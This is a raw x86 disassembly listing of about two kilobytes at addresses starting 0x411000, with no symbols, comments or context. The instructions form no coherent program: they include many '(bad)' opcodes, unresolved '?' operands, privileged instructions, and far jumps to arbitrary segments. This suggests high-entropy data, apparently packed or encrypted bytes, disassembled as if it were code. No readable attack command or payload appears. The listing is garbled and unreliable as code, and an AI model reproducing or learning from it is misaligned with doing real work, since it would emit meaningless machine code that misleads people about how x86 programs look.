  41100a:	inc    eax
  41100b:	stos   BYTE PTR es:[edi],al
  41100c:	cmp    eax,0xc100615d
  411011:	xlat   BYTE PTR ds:[ebx]
  411012:	add    BYTE PTR [ecx+0x3241cc3b],al
  411018:	push   0x11
  41101a:	and    al,0x9b
  41101c:	fwait
  41101d:	dec    eax
  41101e:	lahf   
  41101f:	push   esp
  411020:	dec    esp
  411021:	ret    0x7c27
  411024:	sub    al,0xe9
  411026:	or     eax,0xda44d3ce
  41102b:	mov    fs,WORD PTR [edi]
  41102d:	xchg   DWORD PTR [edx],esi
  41102f:	mov    edi,0x56c014f3
  411034:	dec    edx
  411035:	sub    al,BYTE PTR [edi+0x74bf0d6]
  41103b:	aam    0xaf
  41103d:	lock jbe 0x41101e
  411040:	fadd   DWORD PTR [esi+0x3521b92]
  411046:	xor    ebx,ebp
  411048:	mov    dh,BYTE PTR [ebp-0x28c085ec]
  41104e:	call   0xae0c:0x4d0d3f4a
  411055:	test   DWORD PTR [edi],0xa1b1c0c6
  41105b:	outs   dx,BYTE PTR ds:[esi]
  41105c:	xor    al,0xc7
  41105e:	mov    ebp,0x58b93ef2
  411063:	je     0x4110be
  411065:	cli    
  411066:	push   ebp
  411067:	and    BYTE PTR [ebp+0x55112612],bh
  41106d:	addr16 xchg bp,ax
  411070:	pop    ebp
  411071:	pop    ss
  411072:	sbb    edi,0xffffffe4
  411075:	mov    al,ds:0x8ed0c13c
  41107a:	jb     0x411000
  41107c:	xlat   BYTE PTR ds:[ebx]
  41107d:	jmp    0xd58e092f
  411082:	(bad)  
  411083:	adc    ax,0x438a
  411087:	inc    eax
  411088:	and    DWORD PTR [ebx],0xffffff8d
  41108b:	jb     0x4110bb
  41108d:	jnp    0x411039
  41108f:	je     0x411088
  411091:	adc    eax,0x46f5d6a1
  411096:	dec    ecx
  411097:	jno    0x4110f1
  411099:	add    ebx,DWORD PTR [ebp+0x2]
  41109c:	dec    esi
  41109d:	shl    DWORD PTR [edx-0x57],cl
  4110a0:	div    edx
  4110a2:	iret   
  4110a3:	(bad)  
  4110a5:	xor    eax,0xd9bef8ec
  4110aa:	inc    esp
  4110ab:	xor    dl,BYTE PTR [ecx+0x5885ae56]
  4110b1:	xchg   ebx,eax
  4110b2:	scas   ax,WORD PTR es:[edi]
  4110b4:	inc    ebx
  4110b5:	cmc    
  4110b6:	addr16 std 
  4110b8:	out    dx,al
  4110b9:	das    
  4110ba:	jbe    0x411109
  4110bc:	repz mov ebp,0xeb294604
  4110c2:	aaa    
  4110c3:	adc    al,BYTE PTR [ebx-0x793e7326]
  4110c9:	xor    eax,0x48a99723
  4110ce:	cmp    DWORD PTR ds:0x1f450d6d,ecx
  4110d4:	jo     0x41114b
  4110d6:	aad    0x8f
  4110d8:	add    al,0x5d
  4110da:	jmp    0xb150:0x682fbee4
  4110e1:	lock scas al,BYTE PTR es:[edi]
  4110e3:	adc    DWORD PTR [ebx],esp
  4110e5:	sbb    BYTE PTR [ebp-0x45],0x5b
  4110e9:	jle    0x4110cf
  4110eb:	cli    
  4110ec:	fwait
  4110ed:	addr16 in al,0xcb
  4110f0:	jae    0x4110ba
  4110f2:	push   esi
  4110f3:	inc    esp
  4110f4:	in     eax,0x22
  4110f6:	dec    edi
  4110f7:	jmp    0x6f034b45
  4110fc:	lea    edx,[ebx+0x75de962b]
  411102:	inc    ebx
  411103:	jge    0x4110b7
  411105:	sahf   
  411106:	imul   edx,DWORD PTR [ebx+0x5ec7bc3b],0x32
  41110d:	push   ds
  41110e:	sub    eax,0x92d8345e
  411113:	dec    esp
  411114:	fstp   st(6)
  411116:	inc    ebp
  411117:	fadd   DWORD PTR [ecx-0x6]
  41111a:	fbstp  TBYTE PTR [esi-0x14]
  41111d:	ja     0x41115b
  41111f:	shr    DWORD PTR [edi-0x21],cl
  411122:	jne    0x4110d8
  411124:	pushf  
  411125:	sub    DWORD PTR ds:0x873ac26d,esp
  41112b:	sbb    ebx,eax
  41112d:	test   al,0x24
  41112f:	daa    
  411130:	mov    esp,0xf43ce243
  411135:	aas    
  411136:	push   ecx
  411137:	outs   dx,DWORD PTR ds:[esi]
  411138:	je     0x411115
  41113a:	jae    0x411183
  41113c:	xchg   esi,eax
  41113d:	jno    0x4110d7
  41113f:	mov    esi,0xec71f412
  411144:	test   al,0xdf
  411146:	leave  
  411147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411148:	fbld   TBYTE PTR [ecx+eax*1]
  41114b:	sbb    ebp,esp
  41114d:	cdq    
  41114e:	into   
  41114f:	loope  0x41113d
  411151:	mov    al,bh
  411153:	adc    DWORD PTR gs:[edx],0xffffffa7
  411157:	addr16 rdpmc 
  41115a:	shl    BYTE PTR [edx-0x74],0xa1
  41115e:	mov    esi,0xdc4d2168
  411163:	mov    DWORD PTR [ebx],esi
  411165:	test   BYTE PTR [ebp+0x11],0xd9
  411169:	mov    ch,0xbb
  41116b:	cmp    al,0xb2
  41116d:	ror    DWORD PTR [edx-0x5c],0xac
  411171:	aam    0x6a
  411173:	scas   eax,DWORD PTR es:[edi]
  411174:	or     DWORD PTR [edi],esp
  411176:	out    dx,eax
  411177:	pop    esi
  411178:	add    DWORD PTR [eax+0x2e2b58db],0x1bbfd65f
  411182:	jecxz  0x411109
  411184:	cwde   
  411185:	loopne 0x4111e5
  411187:	and    eax,0x54125db
  41118c:	int    0xf5
  41118e:	pop    es
  41118f:	ins    BYTE PTR es:[edi],dx
  411190:	jbe    0x4111bd
  411192:	mov    al,ds:0x49d51525
  411197:	into   
  411198:	arpl   WORD PTR [ecx+0x74e9b2c3],cx
  41119e:	sub    al,0xc1
  4111a0:	ds cli 
  4111a2:	jmp    0x5a103f5f
  4111a7:	lods   eax,DWORD PTR ds:[esi]
  4111a8:	pop    ss
  4111a9:	jg     0x41120e
  4111ab:	bound  eax,QWORD PTR [eax-0x4fe6fecc]
  4111b1:	cwde   
  4111b2:	sub    BYTE PTR [edx],ah
  4111b4:	pop    ebx
  4111b5:	and    DWORD PTR [ebp+0x6262aeee],esp
  4111bb:	cmp    al,0x6c
  4111bd:	aaa    
  4111be:	jnp    0x411217
  4111c0:	lods   al,BYTE PTR ds:[esi]
  4111c1:	(bad)  
  4111c3:	and    DWORD PTR [eax-0x79a840bd],0x7dbb00db
  4111cd:	neg    DWORD PTR [ebp+0x6894784a]
  4111d3:	push   es
  4111d4:	dec    edx
  4111d5:	sbb    esp,DWORD PTR [eax-0x2a]
  4111d8:	xchg   ebx,eax
  4111d9:	push   cs
  4111da:	in     al,dx
  4111db:	dec    edi
  4111dc:	sar    DWORD PTR [ecx+0x68],cl
  4111df:	xchg   edx,eax
  4111e0:	inc    eax
  4111e1:	scas   al,BYTE PTR es:[di]
  4111e3:	hlt    
  4111e4:	xchg   esi,ebp
  4111e6:	jp     0x4111af
  4111e8:	and    eax,edi
  4111ea:	gs fwait
  4111ec:	mov    edi,?
  4111ee:	add    DWORD PTR [ebx],edx
  4111f0:	int3   
  4111f1:	cmp    DWORD PTR [ecx+0x796ecdbe],0xffffff9d
  4111f8:	enter  0xc253,0x2a
  4111fc:	sub    eax,0x9770fb10
  411201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411202:	xchg   edx,eax
  411203:	popf   
  411204:	dec    esi
  411205:	rol    BYTE PTR [edi],0x4c
  411208:	out    dx,al
  411209:	push   0x31
  41120b:	and    al,0x8a
  41120d:	loop   0x4111e9
  41120f:	enter  0x9c8,0xe4
  411213:	jp     0x4111b5
  411215:	dec    esp
  411216:	std    
  411217:	(bad)  
  411218:	mov    ebp,DWORD PTR [ebp+0x1c]
  41121b:	pop    eax
  41121c:	push   es
  41121d:	cdq    
  41121e:	mov    al,ds:0xc37bc8ea
  411223:	add    eax,0x7c161788
  411228:	pop    eax
  411229:	sbb    esi,DWORD PTR [edi+0x5ef2a8a]
  41122f:	mov    BYTE PTR [esi],cl
  411231:	ja     0x41125d
  411233:	lods   eax,DWORD PTR ds:[esi]
  411234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411235:	outs   dx,BYTE PTR ds:[esi]
  411237:	dec    edx
  411238:	ins    DWORD PTR es:[edi],dx
  411239:	std    
  41123a:	mov    dl,0x1b
  41123c:	pusha  
  41123d:	jae    0x411273
  41123f:	ret    0x929f
  411242:	push   ebx
  411243:	fs push eax
  411245:	jge    0x41121f
  411247:	data16 and BYTE PTR [esi-0x61],0xb1
  41124c:	fdivr  DWORD PTR [edx]
  41124e:	xchg   ebp,eax
  41124f:	push   esi
  411250:	retf   0x83c7
  411253:	xchg   esp,eax
  411254:	call   0xc230acb7
  411259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41125a:	and    al,0x21
  41125c:	stos   DWORD PTR es:[edi],eax
  41125d:	das    
  41125e:	jns    0x411270
  411260:	sahf   
  411261:	das    
  411262:	(bad)  [ebx-0x39716175]
  411268:	inc    edi
  411269:	cmp    eax,0x48ed57e1
  41126e:	dec    edi
  41126f:	and    dl,BYTE PTR [ebp+0x22]
  411272:	sbb    bh,BYTE PTR [ebx+0x37573245]
  411278:	repnz in eax,dx
  41127a:	es icebp 
  41127c:	jne    0x411299
  41127e:	in     eax,dx
  41127f:	mov    ebx,0xb5734f21
  411284:	sysret 
  411286:	cmp    al,0xb8
  411288:	jnp    0x411275
  41128a:	jb     0x41122e
  41128c:	push   esi
  41128d:	scas   al,BYTE PTR es:[edi]
  41128e:	ret    
  41128f:	vandps ymm2,ymm1,YMMWORD PTR [eax+ecx*2]
  411294:	or     bh,dh
  411296:	and    eax,0xc48464a1
  41129b:	js     0x41125e
  41129d:	sub    ecx,edi
  41129f:	sbb    edx,esp
  4112a1:	mov    ah,0x40
  4112a3:	aas    
  4112a4:	sbb    al,0x74
  4112a6:	out    0xa2,al
  4112a8:	test   eax,0x8cd712af
  4112ad:	jg     0x41126f
  4112af:	add    BYTE PTR [esp+ecx*2-0xf],bh
  4112b3:	out    dx,al
  4112b4:	mov    cl,0xf0
  4112b6:	lock sbb al,0xef
  4112b9:	aad    0x97
  4112bb:	mov    esp,0x6e939f24
  4112c0:	rcr    esi,cl
  4112c2:	jae    0x411328
  4112c4:	dec    esp
  4112c5:	dec    edx
  4112c6:	clc    
  4112c7:	and    edi,DWORD PTR ds:0x3591c99c
  4112cd:	mov    eax,ds:0x80bee24e
  4112d2:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4112d4:	inc    ebp
  4112d5:	push   ecx
  4112d6:	mov    al,ds:0xbc41fbe5
  4112db:	add    cl,bl
  4112dd:	mov    edx,0x8f68e206
  4112e2:	hlt    
  4112e3:	push   esi
  4112e4:	sbb    esp,DWORD PTR [esi-0x21db0d89]
  4112ea:	cmp    BYTE PTR [ecx],bl
  4112ec:	add    eax,0x5aaa1e77
  4112f1:	out    dx,eax
  4112f2:	mov    ds:0x2d3f606d,eax
  4112f7:	ins    BYTE PTR es:[edi],dx
  4112f8:	pushf  
  4112f9:	aaa    
  4112fa:	sub    ah,BYTE PTR [esi+0x77]
  4112fd:	mov    dh,0xce
  4112ff:	int3   
  411300:	mov    ?,WORD PTR [esi-0x20d1d3c7]
  411306:	dec    ebx
  411307:	dec    esp
  411308:	pop    ds
  411309:	push   ebx
  41130a:	or     eax,0x5ed1fa76
  41130f:	sub    al,0x44
  411311:	xor    BYTE PTR [edi+0x7d],bl
  411314:	mov    ah,BYTE PTR [esi-0x59585d7e]
  41131a:	nop
  41131b:	sub    eax,0x9bd8d83e
  411320:	adc    si,bp
  411323:	dec    ecx
  411324:	jbe    0x4112e6
  411326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411327:	mov    eax,ds:0xbd2a3336
  41132c:	xor    edx,esi
  41132e:	loope  0x411324
  411330:	aas    
  411331:	push   ss
  411332:	imul   esi,DWORD PTR [ebx+0x5d],0x5
  411336:	mov    ebx,0x41f683d0
  41133b:	mov    bh,0x59
  41133d:	ss ds popf 
  411340:	lods   al,BYTE PTR ds:[esi]
  411341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411342:	lods   eax,DWORD PTR ds:[esi]
  411343:	imul   eax,esi,0xfffffff5
  411346:	push   esi
  411347:	(bad)  
  411348:	ins    BYTE PTR es:[edi],dx
  411349:	mov    bh,0x94
  41134b:	jecxz  0x411317
  41134d:	imul   ebx,DWORD PTR [ecx+0x51d391bf],0xfffffffe
  411354:	push   edi
  411355:	and    DWORD PTR [esi-0x3],ebx
  411358:	jns    0x411357
  41135a:	mov    gs,WORD PTR [edi+0x16]
  41135d:	or     edx,ebx
  41135f:	xor    al,0x8b
  411361:	fstp   TBYTE PTR [edi+0x19f79d46]
  411367:	stos   DWORD PTR es:[edi],eax
  411368:	fimul  WORD PTR [edi-0x49db3ffc]
  41136e:	test   BYTE PTR [edi-0x38c74309],dl
  411374:	pop    eax
  411375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411376:	or     BYTE PTR [eax+0x3bdd4c1e],ah
  41137c:	fstp   TBYTE PTR [eax+0x5e]
  41137f:	ror    BYTE PTR [esi+esi*8],0x4d
  411383:	mov    cl,0x4c
  411385:	xor    al,BYTE PTR [edi+0x18014e2]
  41138b:	out    0x96,al
  41138d:	rol    DWORD PTR [edx-0x21],cl
  411390:	leave  
  411391:	mov    ch,0x72
  411393:	(bad)  
  411394:	test   DWORD PTR [eax],eax
  411396:	push   eax
  411397:	fdivr  st(0),st
  411399:	push   0xffffffce
  41139b:	sub    eax,0xbb96b803
  4113a0:	leave  
  4113a1:	aad    0xf7
  4113a3:	jbe    0x411404
  4113a5:	inc    esi
  4113a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113a7:	xchg   edx,eax
  4113a8:	jmp    0x41136e
  4113aa:	jae    0x41132e
  4113ac:	xor    al,0xe6
  4113ae:	sub    DWORD PTR [esi],edi
  4113b0:	adc    eax,DWORD PTR [eax]
  4113b2:	fmul   DWORD PTR [edi-0x38cfb1e]
  4113b8:	out    0xa2,al
  4113ba:	sub    eax,esp
  4113bc:	adc    ebx,0x30
  4113bf:	and    eax,0x35df90f4
  4113c4:	mov    esp,0xdb0310aa
  4113c9:	fist   DWORD PTR [ebp+0x290b9701]
  4113cf:	xchg   BYTE PTR [ecx+0x7b5042f7],bl
  4113d5:	xchg   esi,eax
  4113d6:	sbb    al,0xc8
  4113d8:	mov    bh,0xe4
  4113da:	sub    DWORD PTR [edi-0x33a87e52],edi
  4113e0:	push   0xcfcb91bb
  4113e5:	mov    ds:0x366c95bb,al
  4113ea:	xchg   ebp,eax
  4113eb:	bound  esp,QWORD PTR [ebx]
  4113ed:	xlat   BYTE PTR ds:[ebx]
  4113ee:	push   ss
  4113ef:	xlat   BYTE PTR ds:[ebx]
  4113f0:	jle    0x411458
  4113f2:	mov    ecx,0x933b6a6a
  4113f7:	scas   eax,DWORD PTR es:[edi]
  4113f8:	(bad)  
  4113fa:	arpl   WORD PTR [esi+0x2f],sp
  4113fd:	je     0x41139d
  4113ff:	test   eax,0xc04e61d5
  411404:	data16 jo 0x411395
  411407:	rol    DWORD PTR ds:0x3b82bc59,1
  41140d:	idiv   cl
  41140f:	neg    DWORD PTR [eax]
  411411:	and    eax,0xced5eb1f
  411416:	push   ss
  411417:	xchg   edx,eax
  411418:	sbb    BYTE PTR [esi-0x558ce179],ah
  41141e:	mov    edi,fs
  411420:	loopne 0x411467
  411422:	and    ecx,esi
  411424:	xor    eax,0xef2d4be0
  411429:	add    bl,ch
  41142b:	jle    0x41143b
  41142d:	sar    DWORD PTR [edx+0x376240f6],0xc0
  411434:	imul   edi,ecx,0xffffffd4
  411437:	scas   eax,DWORD PTR es:[edi]
  411438:	ret    
  411439:	shl    BYTE PTR [edx+ebp*4+0x2a],0x45
  41143e:	or     esp,edi
  411440:	xor    al,0xab
  411442:	sbb    edx,edx
  411444:	cld    
  411445:	push   0xffffff8c
  411447:	sub    eax,0x74a27b73
  41144c:	je     0x41147b
  41144e:	and    DWORD PTR [eax-0x701b2a4c],edi
  411454:	adc    BYTE PTR [esi+edi*1-0x8],cl
  411458:	stos   BYTE PTR es:[edi],al
  411459:	shl    BYTE PTR [esp+esi*4],0x4b
  41145d:	lods   al,BYTE PTR ds:[esi]
  41145e:	loope  0x411427
  411460:	dec    esi
  411461:	cmp    DWORD PTR [edx],0xfdd07f95
  411467:	inc    ecx
  411468:	mul    bh
  41146a:	or     BYTE PTR [ecx-0x14],al
  41146d:	push   ebx
  41146e:	xor    eax,0xe2a85178
  411473:	mov    ecx,DWORD PTR [edi+0x20]
  411476:	jno    0x411423
  411478:	lods   eax,DWORD PTR ds:[esi]
  411479:	loopne 0x4114fa
  41147b:	rcr    BYTE PTR [ecx],cl
  41147d:	retf   0x12f3
  411480:	dec    edx
  411481:	and    DWORD PTR gs:0x5cd4d6ec,0xd610d7e3
  41148c:	xchg   esi,eax
  41148d:	push   eax
  41148e:	stos   BYTE PTR es:[edi],al
  41148f:	aaa    
  411490:	and    ebp,DWORD PTR [edi+edi*4]
  411493:	retf   
  411494:	inc    ebp
  411495:	outs   dx,DWORD PTR ds:[esi]
  411496:	jmp    0x43b8:0x971b1862
  41149d:	imul   ecx,DWORD PTR [edi-0x7a],0xffffffd3
  4114a1:	es mov edi,0x4e01e90c
  4114a7:	cmp    esp,DWORD PTR ds:0x931bfc69
  4114ad:	or     BYTE PTR [ecx],bl
  4114af:	cld    
  4114b0:	in     eax,dx
  4114b1:	dec    ecx
  4114b2:	lods   al,BYTE PTR ds:[esi]
  4114b3:	adc    ebx,DWORD PTR [ecx+0x5f5b5d5e]
  4114b9:	sbb    DWORD PTR [edx+ebx*1+0x170397b1],ebp
  4114c0:	inc    edx
  4114c1:	mov    edx,0xf77a8fd1
  4114c6:	ds imul ebx,ebp,0x6602ed47
  4114cd:	(bad)  
  4114ce:	and    bh,BYTE PTR [ebx+edi*1-0x26]
  4114d2:	jle    0x41145a
  4114d4:	sbb    al,0xe5
  4114d6:	sub    eax,0xea7efa8d
  4114db:	loop   0x411528
  4114dd:	jae    0x411462
  4114df:	add    eax,0xde2d3896
  4114e4:	js     0x41149d
  4114e6:	(bad)  
  4114e7:	sub    BYTE PTR [eax-0x1f023df4],al
  4114ed:	adc    dh,BYTE PTR [edx-0x4b]
  4114f0:	(bad)  
  4114f1:	(bad)  
  4114f2:	sbb    DWORD PTR [esi-0x25],ecx
  4114f5:	out    dx,al
  4114f6:	jp     0x411530
  4114f8:	and    BYTE PTR [ebx-0x3dafd08d],dl
  4114fe:	call   0x2e19:0x5b210d3f
  411505:	mov    al,0x5b
  411507:	xchg   ebx,eax
  411508:	icebp  
  411509:	outs   dx,BYTE PTR ds:[esi]
  41150a:	adc    eax,DWORD PTR [edi-0x48a72fc]
  411510:	in     al,0x6b
  411512:	enter  0x36c0,0xe5
  411516:	dec    eax
  411517:	xchg   esp,eax
  411518:	leave  
  411519:	out    0xb6,al
  41151b:	(bad)
  41151e:	add    dl,ah
  411520:	inc    esi
  411521:	pushf  
  411522:	lock leavew 
  411525:	mov    ds:0xe84c27f5,al
  41152a:	mov    al,0xe
  41152c:	jecxz  0x411505
  41152e:	xor    ch,dl
  411530:	fmul   st,st(3)
  411532:	mov    cl,0x92
  411534:	mov    ?,WORD PTR [edx+0xb]
  411537:	xchg   esi,eax
  411538:	mov    ah,dl
  41153a:	enter  0x5d73,0x13
  41153e:	icebp  
  41153f:	sbb    cl,BYTE PTR [ecx+0x163f74a7]
  411545:	mov    edi,DWORD PTR [ecx+0x607c00bb]
  41154b:	scas   al,BYTE PTR es:[edi]
  41154c:	jb     0x4114f7
  41154e:	xchg   ebp,eax
  41154f:	pop    ebx
  411550:	and    eax,0x8fe8f30
  411555:	jo     0x411553
  411557:	sar    BYTE PTR [eax],1
  411559:	shl    DWORD PTR [ebx+0x7e],1
  41155c:	mov    dh,0x18
  41155e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41155f:	mov    esp,0x5242db29
  411564:	mov    edx,0x4d2cbe96
  411569:	je     0x411502
  41156b:	sub    edx,DWORD PTR [ecx]
  41156d:	cwde   
  41156e:	pop    ds
  41156f:	wrmsr  
  411571:	jl     0x41155e
  411573:	xchg   esp,eax
  411574:	mov    fs,esi
  411576:	loope  0x411553
  411578:	cmp    BYTE PTR [ecx+0x3a],bl
  41157b:	fs scas al,BYTE PTR es:[edi]
  41157d:	mov    ds:0x641799f7,eax
  411582:	dec    esp
  411583:	xor    bh,BYTE PTR [esi]
  411585:	sbb    eax,0x3ee2b426
  41158a:	push   ss
  41158b:	ret    
  41158c:	es cmp eax,esi
  41158f:	sub    BYTE PTR [esi+ebp*8],0x7f
  411593:	test   eax,0x5b3ac276
  411598:	push   ss
  411599:	ret    
  41159a:	mov    eax,0xb75dc9d3
  41159f:	test   eax,0x9658eaa8
  4115a4:	jge    0x411593
  4115a6:	adc    DWORD PTR [eax+ecx*8-0x72],ecx
  4115aa:	push   ebx
  4115ab:	or     BYTE PTR [esi],al
  4115ad:	pushf  
  4115ae:	cmp    edx,DWORD PTR [esi-0x34]
  4115b1:	adc    eax,0x71fd07a0
  4115b6:	fs in  al,dx
  4115b8:	mov    dl,0x94
  4115ba:	int3   
  4115bb:	xchg   ebx,eax
  4115bc:	call   0x96cc:0x98434e75
  4115c3:	(bad)  
  4115c4:	jns    0x4115ef
  4115c6:	adc    BYTE PTR [edx-0x4dd8cc9f],ch
  4115cc:	(bad)  
  4115cd:	sbb    DWORD PTR [esi-0x70597f2e],esp
  4115d3:	cmp    BYTE PTR [eax+0x7f],dh
  4115d6:	cmp    esp,DWORD PTR [edx+ebx*1-0x27]
  4115da:	dec    ecx
  4115db:	imul   edi,esi,0xffffff93
  4115de:	push   edi
  4115df:	push   ss
  4115e0:	sbb    ecx,DWORD PTR [eax]
  4115e2:	cmp    DWORD PTR [esi],edi
  4115e4:	sbb    ecx,DWORD PTR [edi-0x6e5231f8]
  4115ea:	shl    DWORD PTR [esi*2+0x6c9749ce],cl
  4115f1:	adc    BYTE PTR [ecx-0x208d1f62],dl
  4115f7:	jb     0x41163d
  4115f9:	push   ecx
  4115fa:	shl    BYTE PTR [ebx-0x678d46f6],1
  411600:	push   0x20
  411602:	fistp  DWORD PTR [ebp-0x5afc75bc]
  411608:	jbe    0x4115df
  41160a:	sub    DWORD PTR [edi-0x57cda695],edi
  411610:	int3   
  411611:	(bad)  
  411612:	nop
  411613:	imul   ebx,DWORD PTR [esi-0x7c],0xffffff81
  411617:	sbb    bl,BYTE PTR [edi-0x3dda2ce2]
  41161d:	sbb    ebx,DWORD PTR [esi+0x6c1b690f]
  411623:	or     edi,edi
  411625:	pop    ds
  411626:	mov    al,ds:0x7c270eba
  41162b:	loope  0x411622
  41162d:	jp     0x41167d
  41162f:	mov    DWORD PTR [ecx+0x61],0x42d2bde3
  411636:	mov    ds:0x1f2656ae,eax
  41163b:	or     ecx,DWORD PTR [ebp-0x29]
  41163e:	sti    
  41163f:	aam    0xdb
  411641:	lock mov DWORD PTR [edi],ebp
  411644:	mov    esp,0x46ec1a21
  411649:	jnp    0x411609
  41164b:	cmc    
  41164c:	ret    
  41164d:	sub    cl,BYTE PTR [ebp+0x65242bde]
  411653:	std    
  411654:	iret   
  411655:	scas   al,BYTE PTR es:[edi]
  411656:	mov    eax,ds:0xfa852077
  41165b:	cmp    eax,0x7db4e01b
  411660:	xchg   esp,eax
  411661:	inc    esi
  411662:	cmp    BYTE PTR [ebp+0x36],bl
  411665:	mov    edx,0x9fca3668
  41166a:	mov    esp,0x8e08d0c7
  41166f:	lock dec ecx
  411671:	mov    BYTE PTR [ebx],dl
  411673:	fidiv  DWORD PTR [ecx+0x1]
  411676:	cld    
  411677:	(bad)  
  411678:	test   ecx,edx
  41167a:	in     al,0xa7
  41167c:	mov    cl,0x80
  41167e:	inc    edi
  41167f:	js     0x4116a1
  411681:	out    dx,al
  411682:	fldenv [ebp-0x35cebe4e]
  411688:	out    0xc0,eax
  41168a:	aam    0xd8
  41168c:	fisub  DWORD PTR [ebx+ecx*2-0x648714be]
  411693:	xchg   edx,eax
  411694:	add    esp,edi
  411696:	inc    eax
  411697:	mov    cl,0x56
  411699:	inc    esp
  41169a:	(bad)  
  41169b:	cld    
  41169c:	pushf  
  41169d:	pop    edx
  41169e:	mov    al,0x80
  4116a0:	dec    edi
  4116a1:	leave  
  4116a2:	sub    ebx,ecx
  4116a4:	hlt    
  4116a5:	fdivp  st(3),st
  4116a7:	sbb    esi,eax
  4116a9:	cmp    dl,BYTE PTR [edi-0x29]
  4116ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ad:	aad    0xa
  4116af:	ss in  eax,0x79
  4116b2:	cld    
  4116b3:	iret   
  4116b4:	test   ebx,0x992d9557
  4116ba:	add    al,0xac
  4116bc:	sbb    edi,DWORD PTR [ebp+0x4d2d4bee]
  4116c2:	clc    
  4116c3:	push   edx
  4116c4:	mov    dh,0x10
  4116c6:	and    bh,al
  4116c8:	lds    esi,FWORD PTR [eax+0x5182ae2]
  4116ce:	pop    eax
  4116cf:	add    DWORD PTR [ebx-0x2e],ebx
  4116d2:	xchg   esp,eax
  4116d3:	mov    esp,0xcf2d7bc8
  4116d8:	inc    esp
  4116d9:	icebp  
  4116da:	mov    dh,0x37
  4116dc:	pop    edi
  4116dd:	in     al,dx
  4116de:	dec    eax
  4116df:	jbe    0x411668
  4116e1:	aam    0x5e
  4116e3:	or     BYTE PTR [esi-0x77],cl
  4116e6:	and    ch,dh
  4116e8:	jmp    0x76c8b2c8
  4116ed:	pop    eax
  4116ee:	test   al,0x41
  4116f0:	es loopne 0x411716
  4116f3:	and    eax,0x2a162caa
  4116f8:	sahf   
  4116f9:	(bad)  [eax+0x9]
  4116fc:	xchg   edi,eax
  4116fd:	cmp    eax,0x8c9d82f4
  411702:	xor    DWORD PTR [ebx+0x4403b8ac],0x522e6ffc
  41170c:	jmp    0xed51:0x106d7339
  411713:	pushf  
  411714:	pop    ebx
  411715:	mov    esp,0x7865fd41
  41171a:	fs mov ch,0x3c
  41171d:	ficomp WORD PTR [ebx]
  41171f:	pop    edx
  411720:	add    al,0xc8
  411722:	or     ch,dh
  411724:	imul   BYTE PTR [edx+0x75931059]
  41172a:	sub    BYTE PTR [ebp+0x13],dl
  41172d:	das    
  41172e:	xchg   edi,eax
  41172f:	cs or  eax,0x66142ee4
  411735:	dec    esp
  411736:	adc    DWORD PTR [edi],ebx
  411738:	lds    ebp,FWORD PTR [esi]
  41173a:	in     al,dx
  41173b:	js     0x4116e7
  41173d:	pop    ecx
  41173e:	out    0xdc,al
  411740:	cmc    
  411741:	fild   WORD PTR [edx]
  411743:	cwde   
  411744:	cwde   
  411745:	jle    0x411733
  411747:	xchg   edi,eax
  411748:	iret   
  411749:	out    dx,eax
  41174a:	hlt    
  41174b:	add    eax,0x3cc4ce59
  411750:	sbb    ebx,DWORD PTR [ebx+0x23]
  411753:	pop    esp
  411754:	sub    eax,DWORD PTR [ecx+edx*2-0x224d15e7]
  41175b:	dec    ebp
  41175c:	pop    esp
  41175d:	pop    esi
  41175e:	fidivr WORD PTR [esi-0x18]
  411761:	dec    edx
  411762:	sub    al,0x69
  411764:	mov    cl,0x3d
  411766:	rol    bl,0x5b
  411769:	pop    esi
  41176a:	fldenv [ebx+0x68]
  41176d:	retf   0x6805
  411770:	inc    edi
  411771:	adc    bl,BYTE PTR [edi+0x1d822f82]
  411777:	ins    DWORD PTR es:[edi],dx
  411778:	inc    edi
  411779:	ins    BYTE PTR es:[edi],dx
  41177a:	push   edi
  41177c:	aad    0x42
  41177e:	dec    esi
  41177f:	jbe    0x4117f6
  411781:	cmc    
  411782:	push   cs
  411783:	push   0x27b1b9bc
  411788:	sbb    edx,DWORD PTR [ebp-0x29035b05]
  41178e:	lea    ebp,ds:0x38f222dc
  411794:	inc    esp
  411795:	cmp    dh,ch
  411797:	mov    ds:0x6a8b6c32,eax
  41179c:	stos   BYTE PTR es:[edi],al
  41179d:	fsub   st,st(6)
  41179f:	test   DWORD PTR [ebx-0x4a],eax
  4117a2:	fisttp QWORD PTR [edx-0x30bc0dc9]
  4117a8:	cmp    DWORD PTR [esi+0x56d623de],ecx
  4117ae:	and    DWORD PTR [ebx-0x2d],ebp
  4117b1:	mov    esp,0x779d99c5
  4117b6:	dec    al
  4117b8:	mov    gs,WORD PTR ss:[ecx]
  4117bb:	inc    edi
  4117bc:	test   BYTE PTR [ebx+ecx*1-0x7832092e],ch
  4117c3:	jnp    0x411762
  4117c5:	les    esi,FWORD PTR gs:[eax-0x23540f38]
  4117cc:	dec    esi
  4117cd:	xlat   BYTE PTR ds:[ebx]
  4117ce:	mov    edx,0x93ed4632
  4117d3:	std    
  4117d4:	fidiv  WORD PTR [esi-0x60e43d05]
  4117da:	cwde   
  4117db:	fst    DWORD PTR [edi]
  4117dd:	div    ah
  4117df:	div    ah
  4117e1:	pop    esp
  4117e2:	pop    edi
  4117e3:	mov    esp,0xde3794b6
  4117e8:	pop    ebx
  4117e9:	int    0xeb
  4117eb:	adc    ebp,ebp
  4117ed:	push   eax
  4117ee:	add    esp,DWORD PTR [edi+eiz*2]
  4117f1:	jg     0x411836
  4117f3:	(bad)  
  4117f4:	dec    esp
  4117f5:	ins    DWORD PTR es:[edi],dx
  4117f6:	frstor [edi+0x2e]
  4117f9:	clc    
  4117fa:	data16 jno 0x411798
  4117fd:	pop    edi
  4117fe:	sbb    ah,dl
  411800:	dec    ebp
  411801:	ja     0x4117a9
  411803:	sbb    BYTE PTR [ebx-0x1c],bh
  411806:	jmp    0x954b:0x5e740618
  41180d:	add    eax,0x6a82c19f
  411812:	or     al,0x46
  411814:	or     BYTE PTR [esi],0x3f
